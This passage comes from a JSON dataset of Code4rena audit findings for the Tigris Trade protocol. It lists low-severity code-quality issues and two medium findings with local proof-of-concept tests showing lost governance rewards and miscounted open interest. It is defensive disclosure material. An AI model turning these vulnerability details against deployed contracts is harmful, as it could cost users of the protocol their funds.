      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43184",
      "title": "[19] Missing NATSPEC",
      "impact": "LOW",
      "content": "\nConsider adding NATSPEC on all public/external functions to improve documentation.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L190\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L168\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L183\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L349\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43183",
      "title": "[18] Critical changes should use two-step procedure",
      "impact": "LOW",
      "content": "\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two-step procedure on the critical functions.\n\nConsider adding a two-steps pattern on critical changes to avoid mistakenly transferring ownership of roles or critical functionalities to the wrong address.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L366-L370\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43182",
      "title": "[17] Lack of spacing in comment",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L863\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43181",
      "title": "[16] Declaring a `return named variable` and returning a manual value for the same function",
      "impact": "LOW",
      "content": "\nConsider refactoring the function `MetaContext._msgSender` to use `sender` on [L25](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/MetaContext.sol#L25). E.g. `sender = super._msgSender()`. This will make the function more consistent with the usage of the `return named variable` declared in the function header.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43180",
      "title": "[15] Add a limit for the maximum number of characters per line",
      "impact": "LOW",
      "content": "\nThe solidity [documentation](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#maximum-line-length) recommends a maximum of 120 characters.\n\nConsider adding a limit of 120 characters or less to prevent large lines.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L178\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43179",
      "title": "[14] Use `private constant` consistently",
      "impact": "LOW",
      "content": "\nReplace `constant private` with `private constant`.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L95\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43178",
      "title": "[13] Constants should be upper case",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L96\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43177",
      "title": "[12] Declare interfaces on separate files",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L14-L77\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L9-L13\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L15-L25\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43176",
      "title": "[11] Use time units directly",
      "impact": "LOW",
      "content": "\nThe value `1 days` can be used directly as the constant on [L10](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L10) of `BondNFT.sol` is not needed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43175",
      "title": "[10] Contract layout and order of functions",
      "impact": "LOW",
      "content": "\nThe Solidity style guide [recommends](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-layout) declaring state variables before all functions. Consider moving the state variables from the GovNFT instance highlighted below to the top of the contract.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L263-L269\n\nAnother [recommendation](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions) is to declare internal functions below external functions. \n\nThe instances below highlights internal above external. If possible, consider adding internal functions below external functions for the contract layout.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L884\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L898-L901\n\nFurthermore, it's also recommended to declare pure and view functions at the end of a grouping.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L857\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43174",
      "title": "[09] Pragma float",
      "impact": "LOW",
      "content": "\nAll the contracts in scope are floating the pragma version.\n\n### Recommendation\n\nLocking the pragma helps to ensure that contracts do not accidentally get deployed using an outdated compiler version.\n\nNote that pragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or a package.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43173",
      "title": "[08] Missing unit tests",
      "impact": "LOW",
      "content": "\nIt is crucial to write tests with possibly 100% coverage for smart contracts.\n\nThe following functions are not covered:\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L206-L216\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L311-L313\n\n### Recommendation\n\nIt is recommended to write tests for all possible code flows.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43172",
      "title": "[07] Add an event for critical parameter changes",
      "impact": "LOW",
      "content": "\nAdding events for critical parameter changes will facilitate offchain monitoring and indexing.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L898-L9051\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L912-L920\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L926-L933\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L939-L941\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L952-L969\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L975-L979\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/MetaContext.sol#L9-L11\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43171",
      "title": "[06] Lack of zero address checks for `Trading.sol` constructor for the variables `_position`, `_gov` and `_pairsContract`",
      "impact": "LOW",
      "content": "\nIf these variable get configured with address zero, failure to immediately reset the value can result in unexpected behavior for the project.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L143-L152\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43170",
      "title": "[05] Lack of checks-effects-interactions",
      "impact": "LOW",
      "content": "\nIt's recommended to execute external calls after state changes, to prevent reetrancy bugs.\n\nConsider moving the external calls after the state changes on the following instances:\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L72-L73\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L216-L226\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43169",
      "title": "[04] Usage of deprecated chainlink API",
      "impact": "LOW",
      "content": "\n`latestAnswer()` from chainlink is deprecated and can return stale data.\n\n### Recommendation\n\nUse `latestRoundData()` instead of `latestAnswer()`. Also, adding checks for [additional fields](https://docs.chain.link/data-feeds/price-feeds/api-reference/#latestrounddata) returned from `latestRoundData()` is recommended. E.g.\n\n```\n(uint80 roundID, int256 price,,uint256 timestamp, uint80 answeredInRound) = chainlink.latestRoundData();\nrequire(timestamp != 0, \"round not complete\");\nrequire(answeredInRound >= roundID, \"stale data\");\nrequire(price != 0, \"chainlink error\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43168",
      "title": "[03] Use the safe variant and `ERC721.mint`",
      "impact": "LOW",
      "content": "\n`.mint` won't check if the recipient is able to receive the NFT. If an incorrect  address is passed, it will result in a silent failure and loss of asset.\n\nOpenZeppelin [recommendation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L277) is to use the safe variant of `_mint`.\n\n### Recommendation\n\nReplace `_mint()` with `_safeMint()`.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L313\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L56\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L70\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43167",
      "title": "[02] Unbounded loop",
      "impact": "LOW",
      "content": "\nNew assets are pushed into the state variable `assets` array, at the function `BondNFT.addAsset()`.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L352\n\n`Lock.claimGovFees()` will iterate all the assets.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L110-L120\n\nCurrently, `assets` can grow indefinitely. E.g. there's no maximum limit and there's no functionality to remove assets.\n\nIf the array grows too large, calling `Lack.claimGovFeeds()` might run out of gas and revert. Claiming and distributing rewards will result in a DOS condition.\n\n### Recommendation\n\nAdd a functionality to delete assets or add a maximum size limit for assets.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43166",
      "title": "[01] Use `.call` instead of `.transfer` to send ether",
      "impact": "LOW",
      "content": "\n`.transfer` will relay 2300 gas and `.call` will relay all the gas. If the receive/fallback function from the recipient proxy contract has complex logic, using `.transfer` will fail, causing integration issues.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L588\n\n### Recommendation\n\nReplace `.transfer` with `.call`. Note that the result of `.call` need to be checked. \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43165",
      "title": "[M-23] Governance NFT holder, whose NFT was minted before `Trading._handleOpenFees` function is called, can lose deserved rewards after `Trading._handleOpenFees` function is called",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294>\n\n### Impact\n\nCalling the following `Trading._handleOpenFees` function does not approve the `GovNFT` contract for spending any of the `Trading` contract's `_tigAsset` balance, which is unlike calling the `Trading._handleCloseFees` function below that executes `IStable(_tigAsset).approve(address(gov), type(uint).max)`. Due to this lack of approval, when calling the `Trading._handleOpenFees` function without the `Trading._handleCloseFees` function being called for the same `_tigAsset` beforehand, the `GovNFT.distribute` function's execution of `IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount)` in the `try...catch...` block will not transfer any `_tigAsset` amount as the trade's DAO fees to the `GovNFT` contract. \n\nIn this case, although the Governance NFT holder, whose NFT was minted before the `Trading._handleOpenFees` function is called, deserves the rewards from the DAO fees generated by the trade, this holder does not have any pending rewards after such `Trading._handleOpenFees` function call because none of the DAO fees were transferred to the `GovNFT` contract. Hence, this Governance NFT holder loses the rewards that she or he is entitled to.\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750>\n\n```solidity\n    function _handleOpenFees(\n        uint _asset,\n        uint _positionSize,\n        address _trader,\n        address _tigAsset,\n        bool _isBot\n    )\n        internal\n        returns (uint _feePaid)\n    {\n        ...\n        unchecked {\n            uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;\n            ...\n            IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        }\n        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n    }\n```\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810>\n\n```solidity\n    function _handleCloseFees(\n        uint _asset,\n        uint _payout,\n        address _tigAsset,\n        uint _positionSize,\n        address _trader,\n        bool _isBot\n    )\n        internal\n        returns (uint payout_)\n    {\n        ...\n        IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        IStable(_tigAsset).approve(address(gov), type(uint).max);\n        gov.distribute(_tigAsset, _daoFeesPaid);\n        return payout_;\n    }\n```\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294>\n\n```solidity\n    function distribute(address _tigAsset, uint _amount) external {\n        if (assets.length == 0 || assets[assetsIndex[_tigAsset]] == address(0) || totalSupply() == 0 || !_allowedAsset[_tigAsset]) return;\n        try IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount) {\n            accRewardsPerNFT[_tigAsset] += _amount/totalSupply();\n        } catch {\n            return;\n        }\n    }\n```\n\n### Proof of Concept\n\nFunctions like `Trading.initiateMarketOrder` further call the `Trading._handleOpenFees` function so this POC uses the `Trading.initiateMarketOrder` function.\n\nPlease add the following test in the `Signature verification` `describe` block in `test\\07.Trading.js`. This test will pass to demonstrate the described scenario. Please see the comments in this test for more details.\n\n```typescript\n    it.only(\"Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called, can lose deserved rewards after initiateMarketOrder function is called\", async function () {\n      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"30000\"), parseEther(\"10000\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n\n      // one Governance NFT is minted to owner before initiateMarketOrder function is called\n      const GovNFT = await deployments.get(\"GovNFT\");\n      const govnft = await ethers.getContractAt(\"GovNFT\", GovNFT.address);\n      await govnft.connect(owner).mint();\n\n      // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract\n      await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))\n        .to.emit(trading, 'FeesDistributed')\n        .withArgs(stabletoken.address, \"10000000000000000000\", \"0\", \"0\", \"0\", ethers.constants.AddressZero);\n\n      // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called\n      await govnft.connect(owner).mint();\n      await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);\n\n      // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called\n      expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal(\"0\");\n\n      // owner's Governance NFT was minted before initiateMarketOrder function was called so her or his pending reward amount should be 10000000000000000000.\n      // However, owner's pending reward amount is still 0 because DAO fees were not transferred to GovNFT contract successfully.\n      expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal(\"0\");\n    });\n```\n\nFurthermore, as a suggested mitigation, please add `IStable(_tigAsset).approve(address(gov), type(uint).max);` in the `_handleOpenFees` function as follows in line 749 of `contracts\\Trading.sol`.\n\n```solidity\n689:     function _handleOpenFees(\n690:         uint _asset,\n691:         uint _positionSize,\n692:         address _trader,\n693:         address _tigAsset,\n694:         bool _isBot\n695:     )\n696:         internal\n697:         returns (uint _feePaid)\n698:     {\n699:         IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset);\n...\n732:         unchecked {\n733:             uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;\n734:             _feePaid =\n735:                 _positionSize\n736:                 * (_fees.burnFees + _fees.botFees) // get total fee%\n737:                 / DIVISION_CONSTANT // divide by 100%\n738:                 + _daoFeesPaid;\n739:             emit FeesDistributed(\n740:                 _tigAsset,\n741:                 _daoFeesPaid,\n742:                 _positionSize * _fees.burnFees / DIVISION_CONSTANT,\n743:                 _referrer != address(0) ? _positionSize * _fees.referralFees / DIVISION_CONSTANT : 0,\n744:                 _positionSize * _fees.botFees / DIVISION_CONSTANT,\n745:                 _referrer\n746:             );\n747:             IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n748:         }\n749:         IStable(_tigAsset).approve(address(gov), type(uint).max);   // @audit add this line of code for POC purpose\n750:         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n751:     }\n```\n\nThen, as a comparison, the following test can be added in the `Signature verification` `describe` block in `test\\07.Trading.js`. This test will pass to demonstrate that the Governance NFT holder's pending rewards is no longer 0 after implementing the suggested mitigation. Please see the comments in this test for more details.\n\n```typescript\n    it.only(`If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called,\n             can receive deserved rewards after initiateMarketOrder function is called`, async function () {\n      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"30000\"), parseEther(\"10000\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n\n      // one Governance NFT is minted to owner before initiateMarketOrder function is called\n      const GovNFT = await deployments.get(\"GovNFT\");\n      const govnft = await ethers.getContractAt(\"GovNFT\", GovNFT.address);\n      await govnft.connect(owner).mint();\n\n      // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract\n      await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))\n        .to.emit(trading, 'FeesDistributed')\n        .withArgs(stabletoken.address, \"10000000000000000000\", \"0\", \"0\", \"0\", ethers.constants.AddressZero);\n\n      // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called\n      await govnft.connect(owner).mint();\n      await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);\n\n      // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called\n      expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal(\"0\");\n\n      // If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, owner's pending reward amount should be 10000000000000000000\n      //   because her or his Governance NFT was minted before initiateMarketOrder function was called.\n      expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal(\"10000000000000000000\");\n    });\n```\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L749> can be updated to the following code.\n\n```solidity\n        IStable(_tigAsset).approve(address(gov), type(uint).max);\n        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n```\n\n**[TriHaz (Tigris Trade) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/649#issuecomment-1374442558):**\n > That will happen only with the first opened position until `_handleCloseFees()` is called.\n >\n> Valid but I think it should be low risk as it will mostly not affect anyone. \n>\n> Also the funds that are not distributed will be distributed later because of  `gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));` so no funds will be lost.\n> \n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/649#issuecomment-1385513708):**\n > The warden has shown how, due to a lack of approvals, the rewards earned until the first call to `_handleCloseFees`\n> \n> We also know that `_handleDeposit` will burn the balance of `tigAsset` that is unused.\n> \n> The risk however, is limited to the first (one or) few users, for this reason I believe that Medium Severity is more appropriate.\n> \n> Adding an approval on deployment or before calling `distribute` should help mitigate.\n> \n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/649#issuecomment-1407815329):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177034 \n\n\n\n***\n\n",
      "summary": "\nSummary:\n\nThe bug report discusses an issue with the `Trading._handleOpenFees` function not properly approving the `GovNFT` contract for spending the `Trading` contract's `_tigAsset` balance. This leads to the `GovNFT.distribute` function not transferring any `_tigAsset` amount as trade's DAO fees to the `GovNFT` contract. This results in the Governance NFT holder, whose NFT was minted before the `Trading._handleOpenFees` function was called, losing the rewards they are entitled to. The suggested mitigation is to add a line of code in the `_handleOpenFees` function to approve the `GovNFT` contract for spending the `_tigAsset` balance. The severity of this issue has been debated, with the final resolution being a Medium severity. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/649",
      "tags": [],
      "finders": [
        "rbserver",
        "cccz",
        "bin2chen",
        "KingNFT",
        "HE1M",
        "stealthyz",
        "unforgiven"
      ]
    },
    {
      "id": "43164",
      "title": "[M-21] `executeLimitOrder()` modifies open-interest with a wrong position value",
      "impact": "MEDIUM",
      "content": "\nThe `PairsContract` registers the total long/short position that's open for a pair of assets, whenever a new position is created, the total grows accordingly.\n\nHowever at `executeLimitOrder()` the position size that's added is wrongly calculated - it uses margin before fees, while the actual position is created after subtracting fees.\n\n### Impact\n\nThe OpenInterest would register wrong values (11% diff in the case of PoC), which will distort the balance between long and short positions (the whole point of the OpenInterest is to balance them to be about equal).\n\n### Proof of Concept\n\nIn the following test, an order is created with a x100 leverage, and the position size registered for OI is 11% greater than the actual position created.\n\n```diff\ndiff --git a/test/07.Trading.js b/test/07.Trading.js\nindex ebe9948..dfb7f98 100644\n--- a/test/07.Trading.js\n+++ b/test/07.Trading.js\n@@ -778,7 +778,7 @@ describe(\"Trading\", function () {\n      */\n     it(\"Creating and executing limit buy order, should have correct price and bot fees\", async function () {\n       // Create limit order\n-      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n+      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"100\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n       await trading.connect(owner).initiateLimitOrder(TradeInfo, 1, parseEther(\"20000\"), PermitData, owner.address);\n       expect(await position.limitOrdersLength(0)).to.equal(1); // Limit order opened\n@@ -787,6 +787,9 @@ describe(\"Trading\", function () {\n       await network.provider.send(\"evm_increaseTime\", [10]);\n       await network.provider.send(\"evm_mine\");\n \n+      let count = await position.getCount();\n+      let id = count.toNumber() - 1;\n+\n       // Execute limit order\n       let PriceData = [node.address, 0, parseEther(\"10000\"), 10000000, 2000000000, false]; // 0.1% spread\n       let message = ethers.utils.keccak256(\n@@ -798,8 +801,22 @@ describe(\"Trading\", function () {\n       let sig = await node.signMessage(\n         Buffer.from(message.substring(2), 'hex')\n       );\n+      // trading.connect(owner).setFees(true,3e8,1e8,1e8,1e8,1e8);\n       \n-      await trading.connect(user).executeLimitOrder(1, PriceData, sig);\n+\n+      let oi = await pairscontract.idToOi(0, stabletoken.address);\n+      expect(oi.longOi.toNumber()).to.equal(0);\n+      console.log({oi, stable:stabletoken.address});\n+\n+      await trading.connect(user).executeLimitOrder(id, PriceData, sig);\n+      let trade = await position.trades(id);\n+      console.log(trade);\n+      oi = await pairscontract.idToOi(0, stabletoken.address);\n+      console.log(oi);\n+\n+      expect(oi.longOi.div(10n**18n).toNumber()).to.equal(trade.margin.mul(trade.leverage).div(10n**18n * 10n**18n).toNumber());\n+\n+\n       expect(await position.limitOrdersLength(0)).to.equal(0); // Limit order executed\n       expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Creates open position\n       expect((await trading.openFees()).botFees).to.equal(2000000);\n@@ -807,6 +824,7 @@ describe(\"Trading\", function () {\n       let [,,,,price,,,,,,,] = await position.trades(1);\n       expect(price).to.equal(parseEther(\"20020\")); // Should have guaranteed execution price with spread\n     });\n+    return;\n     it(\"Creating and executing limit sell order, should have correct price and bot fees\", async function () {\n       // Create limit order\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, false, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n@@ -1606,6 +1624,7 @@ describe(\"Trading\", function () {\n       expect(await stabletoken.balanceOf(user.address)).to.equal(parseEther(\"1.5\"));\n     });\n   });\n+  return;\n   describe(\"Modifying functions\", function () {\n     it(\"Updating TP/SL on a limit order should revert\", async function () {\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n\n```\n\nOutput:\n\n    1) Trading\n           Limit orders and liquidations\n             Creating and executing limit buy order, should have correct price and bot fees:\n\n          AssertionError: expected 100000 to equal 90000\n          + expected - actual\n\n          -100000\n          +90000\n\n### Recommended Mitigation Steps\n\nCorrect the calculation to use margin after fees.\n\n**[TriHaz (Tigris Trade) confirmed and 